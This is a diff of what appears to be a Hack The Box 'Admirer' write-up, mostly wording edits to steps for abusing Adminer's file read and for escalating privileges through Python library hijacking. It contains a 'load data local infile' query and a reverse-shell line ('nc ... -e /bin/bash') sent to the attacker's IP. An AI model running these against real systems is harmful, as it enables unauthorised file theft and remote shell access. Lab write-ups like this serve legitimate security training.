@@ -204,7 +204,7 @@ local: html.tar.gz remote: html.tar.gz
 ```
 I downloaded ```dump.sql``` and ```html.tar.gz```.
 
-Extract ```html.tar.gz```.
+Extract ```html.tar.gz```. Under ```html``` folder, there are a lot of folders and files. I checked all of them.
 
 In ```robots.txt```:
 ```
@@ -324,14 +324,14 @@ Processed Requests: 61422
 Filtered Requests: 61419
 Requests/sec.: 777.0924
 ```
-We can see ```info.php``` and ```phptest.php``` inside the ```/utility-scripts``` folder but ```adminer.php``` was not there.
+We can see ```info.php``` and ```phptest.php``` inside the ```/utility-scripts``` folder but ```adminer.php``` was not there in our ```html``` folder.
 
 Let's go to ```http://10.10.10.187/utility-scripts/adminer.php```:
 It seems like it is a database login page. Although I tried all credentials that I found before, I couldn't access the database.
-Finally, I search “Adminer 4.6.2 exploit” on google. I found something about it on here: https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
-I read it carefully and watched the guide video about exploit.
 
-Now we need to create a database in localhost.
+Finally, I search “Adminer 4.6.2 exploit” on google. I found something about it on here: https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool. I read it carefully and watched the guide video about exploit.
+
+Now we need to create a database.
 
 ```
 ┌─[✗]─[root@hsn]─[/home/hsn/Desktop/ctf/htb/admirer]
@@ -395,9 +395,10 @@ Our database is ready.
 Now we need to modify ```/etc/mysql``` to bind it to the database.
 Change ```bind-address   = 127.0.0.1``` with ```bind-address   = 0.0.0.0```
 
-According to the exploitation guide, I can login ```http://10.10.10.187/utility-scripts/adminer.php``` with my database's credentials.
+According to the exploitation guide, I can login ```http://10.10.10.187/utility-scripts/adminer.php``` with my own database's credentials.
 
 I try to login with my credentials. Yes, it works!
+
 Go to SQL Commands and try to execute this:
 ```
 load data local infile '/var/www/html/index.php'
@@ -430,7 +431,7 @@ waldo@admirer:~$ cat user.txt
 dc....f74427afdb15....ef7....cee
 ```
 
-The privilage escalation is always hardest part for me! I hate this XD
+The privilage escalation is always hardest part for me! I hate this :(
 
 ```
 waldo@admirer:~$ sudo -l
@@ -573,11 +574,8 @@ waldo@admirer:/opt/scripts$ ./admin_tasks.sh
 8) Quit
 Choose an option: 3
 no crontab for waldo
-
-I can't change admin_tasks.sh
-Nothing is working!
 ```
-I was wrong! Nothing is working.
+I was wrong! Nothing is working. Also, I couldn't modify ```admin_tasks.sh```.
 
 When I searched “privilage escalation via python” I found this website:
 https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
@@ -591,7 +589,8 @@ import os
 def make_archive(x, y, z):
 	os.system("nc 10.10.14.204 4444 -e '/bin/bash'")
 ```
-When this file is executed, it will execute ```/bin/bash``` on my IP and port 4444. So I need to listen this port.
+
+When this file is executed, it will execute ```/bin/bash``` on my IP and port 4444. So I need to listen this port with netcat.
 ```
 ┌─[✗]─[root@hsn]─[/home/hsn]
 └──╼ #nc -nlvp 4444
